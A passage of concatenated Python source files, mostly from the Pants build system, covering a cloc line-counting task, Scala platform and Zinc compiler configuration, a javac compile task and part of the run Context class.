            return unstructured_path_rewrites[ parameter_value ]
        if parameter_value in unstructured_path_rewrites.itervalues():
            # Path is a rewritten remote path (this might never occur,
            # consider dropping check...)
            return parameter_value

        rewrite, new_unstructured_path_rewrites = self.path_mapper.check_for_arbitrary_rewrite( parameter_value )
        if rewrite:
            unstructured_path_rewrites.update(new_unstructured_path_rewrites)
            return rewrite
        else:                    
            # Did need to rewrite, use original path or value.
            return parameter_value

    def unstructured_path_rewriter( self ):
        return self.rewriter

# coding=utf-8
# Copyright 2015 Pants project contributors (see CONTRIBUTORS.md).
# Licensed under the Apache License, Version 2.0 (see LICENSE).

from __future__ import absolute_import, division, print_function, unicode_literals

import os
from builtins import open

from future.utils import text_type

from pants.backend.graph_info.subsystems.cloc_binary import ClocBinary
from pants.base.workunit import WorkUnitLabel
from pants.engine.fs import FilesContent, PathGlobs, PathGlobsAndRoot
from pants.engine.isolated_process import ExecuteProcessRequest
from pants.task.console_task import ConsoleTask
from pants.util.contextutil import temporary_dir


class CountLinesOfCode(ConsoleTask):
  """Print counts of lines of code."""

  @classmethod
  def subsystem_dependencies(cls):
    return super(CountLinesOfCode, cls).subsystem_dependencies() + (ClocBinary,)

  @classmethod
  def register_options(cls, register):
    super(CountLinesOfCode, cls).register_options(register)
    register('--transitive', type=bool, fingerprint=True, default=True,
             help='Operate on the transitive dependencies of the specified targets.  '
                  'Unset to operate only on the specified targets.')
    register('--ignored', type=bool, fingerprint=True,
             help='Show information about files ignored by cloc.')

  def console_output(self, targets):
    if not self.get_options().transitive:
      targets = self.context.target_roots

    input_snapshots = tuple(
      target.sources_snapshot(scheduler=self.context._scheduler) for target in targets
    )
    input_files = {f.path for snapshot in input_snapshots for f in snapshot.files}

    # TODO: Work out a nice library-like utility for writing an argfile, as this will be common.
    with temporary_dir() as tmpdir:
      list_file = os.path.join(tmpdir, 'input_files_list')
      with open(list_file, 'w') as list_file_out:
        for input_file in sorted(input_files):
          list_file_out.write(input_file)
          list_file_out.write('\n')
      list_file_snapshot = self.context._scheduler.capture_snapshots((
        PathGlobsAndRoot(
          PathGlobs(('input_files_list',)),
          text_type(tmpdir),
        ),
      ))[0]

    cloc_path, cloc_snapshot = ClocBinary.global_instance().hackily_snapshot(self.context)

    directory_digest = self.context._scheduler.merge_directories(tuple(s.directory_digest for s in
      input_snapshots + (
      cloc_snapshot,
      list_file_snapshot,
    )))

    cmd = (
      '/usr/bin/perl',
      cloc_path,
      '--skip-uniqueness',
      '--ignored=ignored',
      '--list-file=input_files_list',
      '--report-file=report',
    )

    # The cloc script reaches into $PATH to look up perl. Let's assume it's in /usr/bin.
    req = ExecuteProcessRequest(
      argv=cmd,
      input_files=directory_digest,
      output_files=('ignored', 'report'),
      description='cloc',
    )
    exec_result = self.context.execute_process_synchronously(req, 'cloc', (WorkUnitLabel.TOOL,))                    

    files_content_tuple = self.context._scheduler.product_request(
      FilesContent,
      [exec_result.output_directory_digest]
    )[0].dependencies

    files_content = {fc.path: fc.content.decode('utf-8') for fc in files_content_tuple}
    for line in files_content['report'].split('\n'):
      yield line

    if self.get_options().ignored:
      yield 'Ignored the following files:'
      for line in files_content['ignored'].split('\n'):
        yield line

# coding=utf-8
# Copyright 2015 Pants project contributors (see CONTRIBUTORS.md).
# Licensed under the Apache License, Version 2.0 (see LICENSE).

from __future__ import absolute_import, division, print_function, unicode_literals

from collections import namedtuple

from pants.backend.jvm.subsystems.jvm_tool_mixin import JvmToolMixin
from pants.backend.jvm.subsystems.zinc_language_mixin import ZincLanguageMixin
from pants.backend.jvm.targets.jar_library import JarLibrary
from pants.build_graph.address import Address
from pants.build_graph.injectables_mixin import InjectablesMixin
from pants.java.jar.jar_dependency import JarDependency
from pants.subsystem.subsystem import Subsystem


# full_version - the full scala version to use.
major_version_info = namedtuple('major_version_info', ['full_version'])


# Note that the compiler has two roles here: as a tool (invoked by the compile task), and as a
# runtime library (when compiling plugins, which require the compiler library as a dependency).
scala_build_info = {
  '2.10': major_version_info(full_version='2.10.6'),
  '2.11': major_version_info(full_version='2.11.12'),
  '2.12': major_version_info(full_version='2.12.4'),
}


# Because scalastyle inspects only the sources, it needn't match the platform version.
scala_style_jar = JarDependency('org.scalastyle', 'scalastyle_2.11', '0.8.0')


# TODO: Sort out JVM compile config model: https://github.com/pantsbuild/pants/issues/4483.
class ScalaPlatform(JvmToolMixin, ZincLanguageMixin, InjectablesMixin, Subsystem):
  """A scala platform.

  :API: public
  """
  options_scope = 'scala'

  @classmethod
  def _create_jardep(cls, name, version):
    return JarDependency(org='org.scala-lang',
                         name=name,
                         rev=scala_build_info[version].full_version)

  @classmethod
  def _create_runtime_jardep(cls, version):
    return cls._create_jardep('scala-library', version)                    

  @classmethod
  def _create_compiler_jardep(cls, version):
    return cls._create_jardep('scala-compiler', version)                    

  @classmethod
  def _key_for_tool_version(cls, tool, version):
    if version == 'custom':
      return tool
    else:
      return '{}_{}'.format(tool, version.replace('.', '_'))

  @classmethod
  def register_options(cls, register):
    def register_scala_compiler_tool(version):
      cls.register_jvm_tool(register,
                            cls._key_for_tool_version('scalac', version),                    
                            classpath=[cls._create_compiler_jardep(version)])

    def register_scala_repl_tool(version, with_jline=False):
      classpath = [cls._create_compiler_jardep(version)]  # Note: the REPL is in the compiler jar.
      if with_jline:
        jline_dep = JarDependency(
            org = 'org.scala-lang',
            name = 'jline',
            rev = scala_build_info[version].full_version
        )
        classpath.append(jline_dep)
      cls.register_jvm_tool(register,
                            cls._key_for_tool_version('scala-repl', version),                    
                            classpath=classpath)

    def register_style_tool(version):
      cls.register_jvm_tool(register,
                            cls._key_for_tool_version('scalastyle', version),                    
                            classpath=[scala_style_jar])

    super(ScalaPlatform, cls).register_options(register)

    register('--scalac-plugins', advanced=True, type=list, fingerprint=True,
            help='Use these scalac plugins.')
    register('--scalac-plugin-args', advanced=True, type=dict, default={}, fingerprint=True,
            help='Map from scalac plugin name to list of arguments for that plugin.')
    cls.register_jvm_tool(register, 'scalac-plugin-dep', classpath=[],
                        help='Search for scalac plugins here, as well as in any '
                                'explicit dependencies.')

    register('--version', advanced=True, default='2.12',
             choices=['2.10', '2.11', '2.12', 'custom'], fingerprint=True,
             help='The scala platform version. If --version=custom, the targets '
                  '//:scala-library, //:scalac, //:scala-repl and //:scalastyle will be used, '
                  'and must exist.  Otherwise, defaults for the specified version will be used.')

    register('--suffix-version', advanced=True, default=None,
             help='Scala suffix to be used in `scala_jar` definitions. For example, specifying '
                  '`2.11` or `2.12.0-RC1` would cause `scala_jar` lookups for artifacts with '
                  'those suffixes.')

    # Register the fixed version tools.
    register_scala_compiler_tool('2.10')
    register_scala_repl_tool('2.10', with_jline=True)  # 2.10 repl requires jline.
    register_style_tool('2.10')

    register_scala_compiler_tool('2.11')
    register_scala_repl_tool('2.11')
    register_style_tool('2.11')

    register_scala_compiler_tool('2.12')
    register_scala_repl_tool('2.12')
    register_style_tool('2.12')

    # Register the custom tools. We provide a dummy classpath, so that register_jvm_tool won't
    # require that a target with the given spec actually exist (not everyone will define custom
    # scala platforms). However if the custom tool is actually resolved, we want that to
    # fail with a useful error, hence the dummy jardep with rev=None.
    def register_custom_tool(key):
      dummy_jardep = JarDependency('missing spec', ' //:{}'.format(key))
      cls.register_jvm_tool(register, cls._key_for_tool_version(key, 'custom'),                    
                            classpath=[dummy_jardep])
    register_custom_tool('scalac')
    register_custom_tool('scala-repl')
    register_custom_tool('scalastyle')

  def _tool_classpath(self, tool, products):
    """Return the proper classpath based on products and scala version."""
    return self.tool_classpath_from_products(products,
                                             self._key_for_tool_version(tool, self.version),                    
                                             scope=self.options_scope)

  def compiler_classpath(self, products):
    return self._tool_classpath('scalac', products)

  def style_classpath(self, products):
    return self._tool_classpath('scalastyle', products)

  @property
  def version(self):
    return self.get_options().version

  def suffix_version(self, name):
    """Appends the platform version to the given artifact name.

    Also validates that the name doesn't already end with the version.
    """
    if self.version == 'custom':
      suffix = self.get_options().suffix_version
      if suffix:
        return '{0}_{1}'.format(name, suffix)
      else:
        raise RuntimeError('Suffix version must be specified if using a custom scala version. '
                           'Suffix version is used for bootstrapping jars.  If a custom '
                           'scala version is not specified, then the version specified in '
                           '--scala-suffix-version is used.  For example for Scala '
                           '2.10.7 you would use the suffix version "2.10".')

    elif name.endswith(self.version):
      raise ValueError('The name "{0}" should not be suffixed with the scala platform version '
                      '({1}): it will be added automatically.'.format(name, self.version))
    return '{0}_{1}'.format(name, self.version)

  @property
  def repl(self):
    """Return the repl tool key."""
    return self._key_for_tool_version('scala-repl', self.version)                    

  def injectables(self, build_graph):
    if self.version == 'custom':
      return

    specs_to_create = [
      ('scalac', self._create_compiler_jardep),
      ('scala-library', self._create_runtime_jardep)
    ]

    for spec_key, create_jardep_func in specs_to_create:
      spec = self.injectables_spec_for_key(spec_key)
      target_address = Address.parse(spec)
      if not build_graph.contains_address(target_address):
        jars = [create_jardep_func(self.version)]
        build_graph.inject_synthetic_target(target_address,
                                           JarLibrary,
                                           jars=jars,
                                           scope='forced')
      elif not build_graph.get_target(target_address).is_synthetic:
        raise build_graph.ManualSyntheticTargetError(target_address)

  @property
  def injectables_spec_mapping(self):
    maybe_suffix = '' if self.version == 'custom' else '-synthetic'
    return {
      # Target spec for the scala compiler library.
      'scalac': ['//:scalac{}'.format(maybe_suffix)],
      # Target spec for the scala runtime library.
      'scala-library': ['//:scala-library{}'.format(maybe_suffix)]
    }

# coding=utf-8
# Copyright 2017 Pants project contributors (see CONTRIBUTORS.md).
# Licensed under the Apache License, Version 2.0 (see LICENSE).

from __future__ import absolute_import, division, print_function, unicode_literals

from builtins import object

from pants.backend.jvm.subsystems.dependency_context import DependencyContext
from pants.backend.jvm.subsystems.java import Java
from pants.backend.jvm.subsystems.jvm_tool_mixin import JvmToolMixin
from pants.backend.jvm.subsystems.scala_platform import ScalaPlatform
from pants.backend.jvm.subsystems.shader import Shader
from pants.backend.jvm.targets.scala_jar_dependency import ScalaJarDependency
from pants.backend.jvm.tasks.classpath_products import ClasspathEntry
from pants.backend.jvm.tasks.classpath_util import ClasspathUtil
from pants.base.build_environment import get_buildroot
from pants.engine.fs import PathGlobs, PathGlobsAndRoot                    
from pants.java.jar.jar_dependency import JarDependency
from pants.subsystem.subsystem import Subsystem
from pants.util.dirutil import fast_relpath                    
from pants.util.memo import memoized_method, memoized_property


class Zinc(object):
  """Configuration for Pants' zinc wrapper tool."""

  ZINC_COMPILE_MAIN = 'org.pantsbuild.zinc.compiler.Main'
  ZINC_EXTRACT_MAIN = 'org.pantsbuild.zinc.extractor.Main'
  DEFAULT_CONFS = ['default']

  ZINC_COMPILER_TOOL_NAME = 'zinc'
  ZINC_EXTRACTOR_TOOL_NAME = 'zinc-extractor'

  class Factory(Subsystem, JvmToolMixin):
    options_scope = 'zinc'

    @classmethod
    def subsystem_dependencies(cls):
      return super(Zinc.Factory, cls).subsystem_dependencies() + (DependencyContext,
                                                                  Java,
                                                                  ScalaPlatform)

    @classmethod
    def register_options(cls, register):
      super(Zinc.Factory, cls).register_options(register)

      zinc_rev = '1.0.3'

      shader_rules = [
          # The compiler-interface and compiler-bridge tool jars carry xsbt and
          # xsbti interfaces that are used across the shaded tool jar boundary so
          # we preserve these root packages wholesale along with the core scala
          # APIs.
          Shader.exclude_package('scala', recursive=True),
          Shader.exclude_package('xsbt', recursive=True),
          Shader.exclude_package('xsbti', recursive=True),
          # Unfortunately, is loaded reflectively by the compiler.
          Shader.exclude_package('org.apache.logging.log4j', recursive=True),
        ]

      cls.register_jvm_tool(register,
                            Zinc.ZINC_COMPILER_TOOL_NAME,
                            classpath=[
                              JarDependency('org.pantsbuild', 'zinc-compiler_2.11', '0.0.7'),                    
                            ],
                            main=Zinc.ZINC_COMPILE_MAIN,
                            custom_rules=shader_rules)

      cls.register_jvm_tool(register,
                            'compiler-bridge',
                            classpath=[
                              ScalaJarDependency(org='org.scala-sbt',
                                                name='compiler-bridge',
                                                rev=zinc_rev,
                                                classifier='sources',
                                                intransitive=True),
                            ])
      cls.register_jvm_tool(register,
                            'compiler-interface',
                            classpath=[
                              JarDependency(org='org.scala-sbt',
                                            name='compiler-interface',
                                            rev=zinc_rev),
                            ],
                            # NB: We force a noop-jarjar'ing of the interface, since it is now
                            # broken up into multiple jars, but zinc does not yet support a sequence
                            # of jars for the interface.
                            main='no.such.main.Main',
                            custom_rules=shader_rules)

      cls.register_jvm_tool(register,
                            Zinc.ZINC_EXTRACTOR_TOOL_NAME,
                            classpath=[
                              JarDependency('org.pantsbuild', 'zinc-extractor_2.11', '0.0.4')                    
                            ])

    @classmethod
    def _zinc(cls, products):
      return cls.tool_jar_from_products(products, Zinc.ZINC_COMPILER_TOOL_NAME, cls.options_scope)

    @classmethod
    def _compiler_bridge(cls, products):
      return cls.tool_jar_from_products(products, 'compiler-bridge', cls.options_scope)

    @classmethod
    def _compiler_interface(cls, products):
      return cls.tool_jar_from_products(products, 'compiler-interface', cls.options_scope)

    def create(self, products):
      """Create a Zinc instance from products active in the current Pants run.

      :param products: The active Pants run products to pluck classpaths from.
      :type products: :class:`pants.goal.products.Products`
      :returns: A Zinc instance with access to relevant Zinc compiler wrapper jars and classpaths.
      :rtype: :class:`Zinc`
      """
      return Zinc(self, products)

  def __init__(self, zinc_factory, products):
    self._zinc_factory = zinc_factory
    self._products = products

  @memoized_property
  def zinc(self):
    """Return the Zinc wrapper compiler classpath.

    :rtype: list of str
    """
    return self._zinc_factory._zinc(self._products)

  @property
  def dist(self):
    """Return the distribution selected for Zinc.

    :rtype: list of str
    """
    return self._zinc_factory.dist

  @memoized_property
  def compiler_bridge(self):
    """Return the path to the Zinc compiler-bridge jar.

    :rtype: str
    """
    return self._zinc_factory._compiler_bridge(self._products)

  @memoized_property
  def compiler_interface(self):
    """Return the path to the Zinc compiler-interface jar.

    :rtype: str
    """
    return self._zinc_factory._compiler_interface(self._products)

  @memoized_method
  def snapshot(self, scheduler):
    buildroot = get_buildroot()
    return scheduler.capture_snapshots((
      PathGlobsAndRoot(
        PathGlobs(
          tuple(
            fast_relpath(a, buildroot)
            for a in (self.zinc, self.compiler_bridge, self.compiler_interface)                    
          )
        ),
        buildroot,
      ),
    ))[0]

  # TODO: Make rebase map work without needing to pass in absolute paths:
  # https://github.com/pantsbuild/pants/issues/6434
  @memoized_property
  def rebase_map_args(self):
    """We rebase known stable paths in zinc analysis to make it portable across machines."""
    rebases = {
        self.dist.real_home: '/dev/null/remapped_by_pants/java_home/',
        get_buildroot(): '/dev/null/remapped_by_pants/buildroot/',
        self._zinc_factory.get_options().pants_workdir: '/dev/null/remapped_by_pants/workdir/',
      }
    return (
        '-rebase-map',
        ','.join('{}:{}'.format(src, dst) for src, dst in rebases.items())
      )

  @memoized_method
  def _compiler_plugins_cp_entries(self):
    """Any additional global compiletime classpath entries for compiler plugins."""
    java_options_src = Java.global_instance()
    scala_options_src = ScalaPlatform.global_instance()

    def cp(instance, toolname):
      scope = instance.options_scope
      return instance.tool_classpath_from_products(self._products, toolname, scope=scope)
    classpaths = (cp(java_options_src, 'javac-plugin-dep') +
                  cp(scala_options_src, 'scalac-plugin-dep'))
    return [(conf, ClasspathEntry(jar)) for conf in self.DEFAULT_CONFS for jar in classpaths]

  @memoized_property
  def extractor(self):
    return self._zinc_factory.tool_classpath_from_products(self._products,
                                                           self.ZINC_EXTRACTOR_TOOL_NAME,
                                                           scope=self._zinc_factory.options_scope)

  def compile_classpath_entries(self, classpath_product_key, target, extra_cp_entries=None):
    classpath_product = self._products.get_data(classpath_product_key)
    if DependencyContext.global_instance().defaulted_property(target, lambda x: x.strict_deps):
      dependencies = target.strict_dependencies(DependencyContext.global_instance())
    else:
      dependencies = DependencyContext.global_instance().all_dependencies(target)

    all_extra_cp_entries = list(self._compiler_plugins_cp_entries())
    if extra_cp_entries:
      all_extra_cp_entries.extend(extra_cp_entries)

    # TODO: We convert dependencies to an iterator here in order to _preserve_ a bug that will be
    # fixed in https://github.com/pantsbuild/pants/issues/4874: `ClasspathUtil.compute_classpath`
    # expects to receive a list, but had been receiving an iterator. In the context of an
    # iterator, `excludes` are not applied
    # in ClasspathProducts.get_product_target_mappings_for_targets.
    return ClasspathUtil.compute_classpath_entries(iter(dependencies),
      classpath_product,
      all_extra_cp_entries,
      self.DEFAULT_CONFS,
    )

  def compile_classpath(self, classpath_product_key, target, extra_cp_entries=None):
    """Compute the compile classpath for the given target."""
    return list(
      entry.path
      for entry in self.compile_classpath_entries(classpath_product_key, target, extra_cp_entries)                    
    )

# coding=utf-8
# Copyright 2018 Pants project contributors (see CONTRIBUTORS.md).
# Licensed under the Apache License, Version 2.0 (see LICENSE).

from __future__ import absolute_import, division, print_function, unicode_literals

import logging
import os
from builtins import str

from future.utils import text_type

from pants.backend.jvm import argfile
from pants.backend.jvm.subsystems.java import Java
from pants.backend.jvm.subsystems.jvm_platform import JvmPlatform
from pants.backend.jvm.targets.annotation_processor import AnnotationProcessor
from pants.backend.jvm.targets.javac_plugin import JavacPlugin
from pants.backend.jvm.targets.jvm_target import JvmTarget
from pants.backend.jvm.tasks.jvm_compile.jvm_compile import JvmCompile
from pants.base.exceptions import TaskError
from pants.base.workunit import WorkUnit, WorkUnitLabel
from pants.engine.fs import DirectoryToMaterialize
from pants.engine.isolated_process import ExecuteProcessRequest
from pants.java.distribution.distribution import DistributionLocator
from pants.util.dirutil import safe_open
from pants.util.process_handler import subprocess


# Well known metadata file to register javac plugins.
_JAVAC_PLUGIN_INFO_FILE = 'META-INF/services/com.sun.source.util.Plugin'

# Well known metadata file to register annotation processors with a java 1.6+ compiler.
_PROCESSOR_INFO_FILE = 'META-INF/services/javax.annotation.processing.Processor'

logger = logging.getLogger(__name__)


class JavacCompile(JvmCompile):
  """Compile Java code using Javac."""

  _name = 'java'

  @staticmethod
  def _write_javac_plugin_info(resources_dir, javac_plugin_target):
    javac_plugin_info_file = os.path.join(resources_dir, _JAVAC_PLUGIN_INFO_FILE)
    with safe_open(javac_plugin_info_file, 'w') as f:
      f.write(javac_plugin_target.classname)

  @classmethod
  def get_args_default(cls, bootstrap_option_values):
    return ('-encoding', 'UTF-8')

  @classmethod
  def get_warning_args_default(cls):
    return ('-deprecation', '-Xlint:all', '-Xlint:-serial', '-Xlint:-path')

  @classmethod
  def get_no_warning_args_default(cls):
    return ('-nowarn', '-Xlint:none', )

  @classmethod
  def get_fatal_warnings_enabled_args_default(cls):
    return ('-Werror',)

  @classmethod
  def get_fatal_warnings_disabled_args_default(cls):
    return ()

  @classmethod
  def register_options(cls, register):
    super(JavacCompile, cls).register_options(register)

  @classmethod
  def subsystem_dependencies(cls):
    return super(JavacCompile, cls).subsystem_dependencies() + (JvmPlatform,)

  @classmethod
  def prepare(cls, options, round_manager):
    super(JavacCompile, cls).prepare(options, round_manager)

  @classmethod
  def product_types(cls):
    return ['runtime_classpath']

  def __init__(self, *args, **kwargs):
    super(JavacCompile, self).__init__(*args, **kwargs)
    self.set_distribution(jdk=True)

  def select(self, target):
    if not isinstance(target, JvmTarget):
      return False
    return target.has_sources('.java')

  def select_source(self, source_file_path):
    return source_file_path.endswith('.java')

  def javac_classpath(self):
    # Note that if this classpath is empty then Javac will automatically use the javac from
    # the JDK it was invoked with.
    return Java.global_javac_classpath(self.context.products)

  def write_extra_resources(self, compile_context):
    """Override write_extra_resources to produce plugin and annotation processor files."""
    target = compile_context.target
    if isinstance(target, JavacPlugin):
      self._write_javac_plugin_info(compile_context.classes_dir, target)
    elif isinstance(target, AnnotationProcessor) and target.processors:
      processor_info_file = os.path.join(compile_context.classes_dir, _PROCESSOR_INFO_FILE)
      self._write_processor_info(processor_info_file, target.processors)

  def _write_processor_info(self, processor_info_file, processors):
    with safe_open(processor_info_file, 'w') as f:
      for processor in processors:
        f.write('{}\n'.format(processor.strip()))

  def execute(self):
    if JvmPlatform.global_instance().get_options().compiler == 'javac':
      return super(JavacCompile, self).execute()

  def compile(self, ctx, args, dependency_classpath, upstream_analysis,
              settings, fatal_warnings, zinc_file_manager,
              javac_plugin_map, scalac_plugin_map):
    classpath = (ctx.classes_dir,) + tuple(ce.path for ce in dependency_classpath)

    if self.get_options().capture_classpath:
      self._record_compile_classpath(classpath, ctx.target, ctx.classes_dir)

    try:
      distribution = JvmPlatform.preferred_jvm_distribution([settings], strict=True)
    except DistributionLocator.Error:
      distribution = JvmPlatform.preferred_jvm_distribution([settings], strict=False)

    javac_cmd = ['{}/bin/javac'.format(distribution.real_home)]

    javac_cmd.extend([
      '-classpath', ':'.join(classpath),
    ])

    if settings.args:
      settings_args = settings.args
      if any('$JAVA_HOME' in a for a in settings.args):
        logger.debug('Substituting "$JAVA_HOME" with "{}" in jvm-platform args.'
                     .format(distribution.home))
        settings_args = (a.replace('$JAVA_HOME', distribution.home) for a in settings.args)
      javac_cmd.extend(settings_args)

      javac_cmd.extend([
        # TODO: support -release
        '-source', str(settings.source_level),
        '-target', str(settings.target_level),
      ])

    if self.execution_strategy == self.HERMETIC:
      javac_cmd.extend([
        # We need to strip the source root from our output files. Outputting to a directory, and
        # capturing that directory, does the job.
        # Unfortunately, javac errors if the directory you pass to -d doesn't exist, and we don't
        # have a convenient way of making a directory in the output tree, so let's just use the
        # working directory as our output dir.
        # This also has the benefit of not needing to strip leading directories from the returned
        # snapshot.
        '-d', '.',
      ])
    else:
      javac_cmd.extend([
        '-d', ctx.classes_dir,
      ])

    javac_cmd.extend(self._javac_plugin_args(javac_plugin_map))

    javac_cmd.extend(args)

    if fatal_warnings:
      javac_cmd.extend(self.get_options().fatal_warnings_enabled_args)
    else:
      javac_cmd.extend(self.get_options().fatal_warnings_disabled_args)

    with argfile.safe_args(ctx.sources, self.get_options()) as batched_sources:
      javac_cmd.extend(batched_sources)

      if self.execution_strategy == self.HERMETIC:
        self._execute_hermetic_compile(javac_cmd, ctx)
      else:
        with self.context.new_workunit(name='javac',
                                       cmd=' '.join(javac_cmd),
                                       labels=[WorkUnitLabel.COMPILER]) as workunit:
          self.context.log.debug('Executing {}'.format(' '.join(javac_cmd)))
          p = subprocess.Popen(javac_cmd, stdout=workunit.output('stdout'), stderr=workunit.output('stderr'))
          return_code = p.wait()
          workunit.set_outcome(WorkUnit.FAILURE if return_code else WorkUnit.SUCCESS)
          if return_code:
            raise TaskError('javac exited with return code {rc}'.format(rc=return_code))

  @classmethod
  def _javac_plugin_args(cls, javac_plugin_map):
    ret = []
    for plugin, args in javac_plugin_map.items():
      for arg in args:
        if ' ' in arg:
          # Note: Args are separated by spaces, and there is no way to escape embedded spaces, as
          # javac's Main does a simple split on these strings.
          raise TaskError('javac plugin args must not contain spaces '
                          '(arg {} for plugin {})'.format(arg, plugin))
      ret.append('-Xplugin:{} {}'.format(plugin, ' '.join(args)))
    return ret

  def _execute_hermetic_compile(self, cmd, ctx):
    # For now, executing a compile remotely only works for targets that
    # do not have any dependencies or inner classes

    input_snapshot = ctx.target.sources_snapshot(scheduler=self.context._scheduler)
    output_files = tuple(
      # Assume no extra .class files to grab. We'll fix up that case soon.
      # Drop the source_root from the file path.
      # Assumes `-d .` has been put in the command.
      os.path.relpath(f.path.replace('.java', '.class'), ctx.target.target_base)
      for f in input_snapshot.files if f.path.endswith('.java')
    )
    exec_process_request = ExecuteProcessRequest(
      argv=tuple(cmd),
      input_files=input_snapshot.directory_digest,
      output_files=output_files,
      description='Compiling {} with javac'.format(ctx.target.address.spec),
    )
    exec_result = self.context.execute_process_synchronously(                    
      exec_process_request,
      'javac',
      (WorkUnitLabel.TASK, WorkUnitLabel.JVM),
    )

    # Dump the output to the .pants.d directory where it's expected by downstream tasks.
    classes_directory = ctx.classes_dir
    self.context._scheduler.materialize_directories((
      DirectoryToMaterialize(text_type(classes_directory), exec_result.output_directory_digest),
    ))


# coding=utf-8
# Copyright 2014 Pants project contributors (see CONTRIBUTORS.md).
# Licensed under the Apache License, Version 2.0 (see LICENSE).

from __future__ import absolute_import, division, print_function, unicode_literals

import os
import sys
from builtins import filter, object
from collections import defaultdict
from contextlib import contextmanager

from twitter.common.collections import OrderedSet

from pants.base.build_environment import get_buildroot, get_scm
from pants.base.worker_pool import SubprocPool
from pants.base.workunit import WorkUnit, WorkUnitLabel
from pants.build_graph.target import Target
from pants.engine.isolated_process import FallibleExecuteProcessResult                    
from pants.goal.products import Products
from pants.goal.workspace import ScmWorkspace
from pants.process.lock import OwnerPrintingInterProcessFileLock
from pants.reporting.report import Report
from pants.source.source_root import SourceRootConfig


class Context(object):
  """Contains the context for a single run of pants.

  Task implementations can access configuration data from pants.ini and any flags they have exposed
  here as well as information about the targets involved in the run.

  Advanced uses of the context include adding new targets to it for upstream or downstream goals to
  operate on and mapping of products a goal creates to the targets the products are associated with.

  :API: public
  """

  class Log(object):
    """A logger facade that logs into the pants reporting framework."""

    def __init__(self, run_tracker):
      self._run_tracker = run_tracker

    def debug(self, *msg_elements):
      self._run_tracker.log(Report.DEBUG, *msg_elements)

    def info(self, *msg_elements):
      self._run_tracker.log(Report.INFO, *msg_elements)

    def warn(self, *msg_elements):
      self._run_tracker.log(Report.WARN, *msg_elements)

    def error(self, *msg_elements):
      self._run_tracker.log(Report.ERROR, *msg_elements)

    def fatal(self, *msg_elements):
      self._run_tracker.log(Report.FATAL, *msg_elements)

  # TODO: Figure out a more structured way to construct and use context than this big flat
  # repository of attributes?
  def __init__(self, options, run_tracker, target_roots,
               requested_goals=None, target_base=None, build_graph=None,
               build_file_parser=None, address_mapper=None, console_outstream=None, scm=None,
               workspace=None, invalidation_report=None, scheduler=None):
    self._options = options
    self.build_graph = build_graph
    self.build_file_parser = build_file_parser
    self.address_mapper = address_mapper
    self.run_tracker = run_tracker
    self._log = self.Log(run_tracker)
    self._target_base = target_base or Target
    self._products = Products()
    self._buildroot = get_buildroot()
    self._source_roots = SourceRootConfig.global_instance().get_source_roots()
    self._lock = OwnerPrintingInterProcessFileLock(os.path.join(self._buildroot, '.pants.workdir.file_lock'))
    self._java_sysprops = None  # Computed lazily.
    self.requested_goals = requested_goals or []
    self._console_outstream = console_outstream or sys.stdout
    self._scm = scm or get_scm()
    self._workspace = workspace or (ScmWorkspace(self._scm) if self._scm else None)
    self._replace_targets(target_roots)
    self._invalidation_report = invalidation_report
    self._scheduler = scheduler

  @property
  def options(self):
    """Returns the new-style options.

    :API: public
    """
    return self._options

  @property
  def log(self):
    """Returns the preferred logger for goals to use.

    :API: public
    """
    return self._log

  @property
  def products(self):
    """Returns the Products manager for the current run.

    :API: public
    """
    return self._products

  @property
  def source_roots(self):
    """Returns the :class:`pants.source.source_root.SourceRoots` instance for the current run.

    :API: public
    """
    return self._source_roots

  @property
  def target_roots(self):
    """Returns the targets specified on the command line.

    This set is strictly a subset of all targets in play for the run as returned by self.targets().
    Note that for a command line invocation that uses wildcard selectors : or ::, the targets
    globbed by the wildcards are considered to be target roots.

    :API: public
    """
    return self._target_roots

  @property
  def console_outstream(self):
    """Returns the output stream to write console messages to.

    :API: public
    """
    return self._console_outstream

  @property
  def scm(self):
    """Returns the current workspace's scm, if any.

    :API: public
    """
    return self._scm

  @property
  def workspace(self):
    """Returns the current workspace, if any."""
    return self._workspace

  @property
  def invalidation_report(self):
    return self._invalidation_report

  def __str__(self):
    ident = Target.identify(self.targets())
    return 'Context(id:{}, targets:{})'.format(ident, self.targets())

  @contextmanager
  def executing(self):
    """A contextmanager that sets metrics in the context of a (v1) engine execution."""
    self._set_target_root_count_in_runtracker()
    yield
    self.run_tracker.pantsd_stats.set_scheduler_metrics(self._scheduler.metrics())
    self._set_affected_target_count_in_runtracker()

  def _set_target_root_count_in_runtracker(self):
    """Sets the target root count in the run tracker's daemon stats object."""
    # N.B. `self._target_roots` is always an expanded list of `Target` objects as
    # provided by `GoalRunner`.
    target_count = len(self._target_roots)
    self.run_tracker.pantsd_stats.set_target_root_size(target_count)
    return target_count

  def _set_affected_target_count_in_runtracker(self):
    """Sets the realized target count in the run tracker's daemon stats object."""
    target_count = len(self.build_graph)
    self.run_tracker.pantsd_stats.set_affected_targets_size(target_count)
    return target_count

  def submit_background_work_chain(self, work_chain, parent_workunit_name=None):
    """
    :API: public
    """
    background_root_workunit = self.run_tracker.get_background_root_workunit()
    if parent_workunit_name:
      # We have to keep this workunit alive until all its child work is done, so
      # we manipulate the context manually instead of using it as a contextmanager.
      # This is slightly funky, but the with-context usage is so pervasive and
      # useful elsewhere that it's worth the funkiness in this one place.
      workunit_parent_ctx = self.run_tracker.new_workunit_under_parent(
        name=parent_workunit_name, labels=[WorkUnitLabel.MULTITOOL], parent=background_root_workunit)
      workunit_parent = workunit_parent_ctx.__enter__()
      done_hook = lambda: workunit_parent_ctx.__exit__(None, None, None)
    else:
      workunit_parent = background_root_workunit  # Run directly under the root.
      done_hook = None
    self.run_tracker.background_worker_pool().submit_async_work_chain(
      work_chain, workunit_parent=workunit_parent, done_hook=done_hook)

  def background_worker_pool(self):
    """Returns the pool to which tasks can submit background work.

    :API: public
    """
    return self.run_tracker.background_worker_pool()

  def subproc_map(self, f, items):
    """Map function `f` over `items` in subprocesses and return the result.

      :API: public

      :param f: A multiproc-friendly (importable) work function.
      :param items: A iterable of pickleable arguments to f.
    """
    try:
      # Pool.map (and async_map().get() w/o timeout) can miss SIGINT.
      # See: http://stackoverflow.com/a/1408476, http://bugs.python.org/issue8844
      # Instead, we map_async(...), wait *with a timeout* until ready, then .get()
      # NB: in 2.x, wait() with timeout wakes up often to check, burning CPU. Oh well.
      res = SubprocPool.foreground().map_async(f, items)
      while not res.ready():
        res.wait(60)  # Repeatedly wait for up to a minute.
        if not res.ready():
          self.log.debug('subproc_map result still not ready...')
      return res.get()
    except KeyboardInterrupt:
      SubprocPool.shutdown(True)
      raise

  @contextmanager
  def new_workunit(self, name, labels=None, cmd='', log_config=None):
